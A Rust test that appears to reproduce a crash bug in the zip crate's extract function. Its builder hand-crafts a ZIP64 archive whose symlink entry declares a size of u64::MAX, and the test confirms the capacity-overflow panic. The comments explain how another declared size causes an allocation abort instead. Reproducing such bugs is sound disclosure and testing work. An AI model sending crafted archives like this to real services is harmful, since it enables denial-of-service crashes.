//! zip-1 (crash-from-input): ZipArchive::extract reserves a symlink target
//! buffer from the attacker-declared uncompressed size (src/read.rs:894,
//! `Vec::with_capacity(file.size() as usize)`), so a tiny ZIP64 archive whose
//! central directory declares a huge size crashes the process.
//!
//! Symptom depends on the declared size (see the brief): a size above
//! isize::MAX (u64::MAX here) is a `capacity overflow` panic from with_capacity;
//! a merely huge but representable size (e.g. 1<<40) instead aborts with
//! "memory allocation of N bytes failed". We demonstrate the catchable panic
//! path with u64::MAX. Exit 0 only if the declared-size allocation crashes.

use std::io::Cursor;
use std::panic;
use zip::ZipArchive;

/// One entry, flagged as a symlink, whose ZIP64 extra field declares
/// `declared_size` uncompressed bytes while storing only `payload`.
fn build(declared_size: u64, payload: &[u8]) -> Vec<u8> {
    const S_IFLNK: u32 = 0o120_000;
    const SENTINEL: u32 = 0xFFFF_FFFF;
    let name = b"link";
    let mut o = Vec::new();
    // local file header
    o.extend_from_slice(&[0x50, 0x4b, 0x03, 0x04]);
    o.extend_from_slice(&45u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0x21u16.to_le_bytes());
    o.extend_from_slice(&0u32.to_le_bytes());
    o.extend_from_slice(&SENTINEL.to_le_bytes());
    o.extend_from_slice(&SENTINEL.to_le_bytes());
    o.extend_from_slice(&(name.len() as u16).to_le_bytes());
    o.extend_from_slice(&20u16.to_le_bytes());
    o.extend_from_slice(name);
    o.extend_from_slice(&0x0001u16.to_le_bytes());
    o.extend_from_slice(&16u16.to_le_bytes());
    o.extend_from_slice(&declared_size.to_le_bytes());
    o.extend_from_slice(&(payload.len() as u64).to_le_bytes());
    o.extend_from_slice(payload);

    let cd_offset = o.len() as u32;
    // central directory header
    o.extend_from_slice(&[0x50, 0x4b, 0x01, 0x02]);
    o.extend_from_slice(&0x031Eu16.to_le_bytes()); // version made by: Unix
    o.extend_from_slice(&45u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0x21u16.to_le_bytes());
    o.extend_from_slice(&0u32.to_le_bytes());
    o.extend_from_slice(&SENTINEL.to_le_bytes());
    o.extend_from_slice(&SENTINEL.to_le_bytes());
    o.extend_from_slice(&(name.len() as u16).to_le_bytes());
    o.extend_from_slice(&20u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&((S_IFLNK | 0o777) << 16).to_le_bytes());
    o.extend_from_slice(&0u32.to_le_bytes());
    o.extend_from_slice(name);
    o.extend_from_slice(&0x0001u16.to_le_bytes());
    o.extend_from_slice(&16u16.to_le_bytes());
    o.extend_from_slice(&declared_size.to_le_bytes());
    o.extend_from_slice(&(payload.len() as u64).to_le_bytes());

    let cd_size = o.len() as u32 - cd_offset;
    // end of central directory
    o.extend_from_slice(&[0x50, 0x4b, 0x05, 0x06]);
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&1u16.to_le_bytes());
    o.extend_from_slice(&1u16.to_le_bytes());
    o.extend_from_slice(&cd_size.to_le_bytes());
    o.extend_from_slice(&cd_offset.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o
}

#[test]
fn symlink_declared_size_crashes_extract() {
    let data = build(u64::MAX, b"/tmp/x");
    let mut reader = ZipArchive::new(Cursor::new(data)).expect("archive opens");
    assert!(reader.by_index(0).unwrap().is_symlink());
    assert_eq!(reader.by_index(0).unwrap().size(), u64::MAX);

    let dest = std::path::PathBuf::from("/tmp/zip1_dest");
    let _ = std::fs::create_dir_all(&dest);

    // Silence the default panic hook so the capacity-overflow panic does not
    // spam stderr; catch_unwind confirms the crash came from the allocation.
    panic::set_hook(Box::new(|_| {}));
    let result = panic::catch_unwind(panic::AssertUnwindSafe(|| {
        let _ = reader.extract(&dest);
    }));
    let _ = panic::take_hook();

    let payload = match result {
        Ok(_) => panic!(
            "BUG NOT PRESENT: extract returned without crashing on a u64::MAX symlink size"
        ),
        Err(e) => e,
    };
    let msg = payload
        .downcast_ref::<String>()
        .map(|s| s.as_str())
        .or_else(|| payload.downcast_ref::<&str>().copied())
        .unwrap_or("<non-string panic>");
    eprintln!("observed panic: {msg}");
    assert!(
        msg.contains("capacity overflow"),
        "expected a capacity-overflow panic from Vec::with_capacity(file.size()), got: {msg}"
    );
    eprintln!("REPRODUCED: extract crashed with capacity overflow from the declared symlink size");
}
